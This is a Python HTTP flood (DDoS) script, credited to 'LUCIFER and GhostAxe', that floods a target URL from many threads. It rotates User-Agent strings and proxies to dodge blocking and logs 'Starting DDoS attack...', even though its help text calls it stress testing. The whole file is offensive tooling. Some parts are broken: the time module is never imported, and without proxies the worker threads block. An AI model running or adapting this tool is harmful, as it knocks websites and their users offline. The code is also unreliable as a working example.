#!/usr/bin/env python3
import argparse
import logging
import random
import threading
import sys
import requests
from requests.exceptions import RequestException, Timeout
from queue import Queue
from collections import defaultdict

print(r"""
███████╗ ██████╗ ███████╗████████╗███████╗██████╗
██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
█████╗  ██║   ██║███████╗   ██║   █████╗  ██████╔╝
██╔══╝  ██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
Created by LUCIFER and GhostAxe - Enhanced for Advanced DDoS
""")

# Argument Parser
parser = argparse.ArgumentParser(description="Distributed HTTP attack tool for stress testing websites")
parser.add_argument("target", help="Target URL or host")
parser.add_argument("-p", "--port", default=80, type=int, help="Target port (default: 80)")
parser.add_argument("-t", "--threads", default=100, type=int, help="Number of threads (default: 100)")
parser.add_argument("-u", "--url", help="Target URL (use with -p for port)")
parser.add_argument("--proxies", type=str, help="Path to proxy list (format: IP:PORT)")
parser.add_argument("--headers", type=str, help="Custom headers in 'key:value' format, comma-separated")
parser.add_argument("--https", action="store_true", help="Use HTTPS for requests")
parser.set_defaults(https=False)
args = parser.parse_args()

logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

# User-Agent List
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
]

# Load Proxies
proxies = []
if args.proxies:
    try:
        with open(args.proxies, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxies)} proxies from {args.proxies}")
    except FileNotFoundError:
        logging.error(f"Proxy file {args.proxies} not found. Exiting.")
        sys.exit(1)

# Request Statistics
stats = defaultdict(int)
stats_lock = threading.Lock()

def log_stats():
    """Log request statistics periodically."""
    while True:
        with stats_lock:
            logging.info(f"Success: {stats['success']} | Failed: {stats['failed']} | Timeout: {stats['timeout']}")
        time.sleep(5)

def send_request(url, headers=None, proxy=None):
    """
    Sends a single HTTP GET request.
    """
    headers = headers or {}
    headers["User-Agent"] = random.choice(user_agents)
    try:
        proxy_dict = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(url, headers=headers, proxies=proxy_dict, timeout=10)
        with stats_lock:
            if response.ok:
                stats['success'] += 1
            else:
                stats['failed'] += 1
        logging.info(f"Request sent to {url} - Status: {response.status_code}")
    except Timeout:
        with stats_lock:
            stats['timeout'] += 1
        logging.warning(f"Request timed out for {url}")
    except RequestException as e:
        with stats_lock:
            stats['failed'] += 1
        logging.warning(f"Error: {e}")

def worker(target, headers, proxy_queue):
    """
    Worker thread function to handle requests.
    """
    while True:
        proxy = proxy_queue.get()
        send_request(target, headers, proxy)
        proxy_queue.put(proxy)  # Recycle proxy

def attack(target, threads, proxies):
    """
    Initiates the attack with the specified parameters.
    """
    logging.info("Starting DDoS attack...")
    headers = {}
    if args.headers:
        for header in args.headers.split(","):
            try:
                key, value = header.split(":")
                headers[key.strip()] = value.strip()
            except ValueError:
                logging.warning(f"Invalid header format: {header}")

    proxy_queue = Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)

    threading.Thread(target=log_stats, daemon=True).start()

    for _ in range(threads):
        threading.Thread(target=worker, args=(target, headers, proxy_queue)).start()

if __name__ == "__main__":
    target = args.url or f"http{'s' if args.https else ''}://{args.target}:{args.port}"
    attack(target, args.threads, proxies)
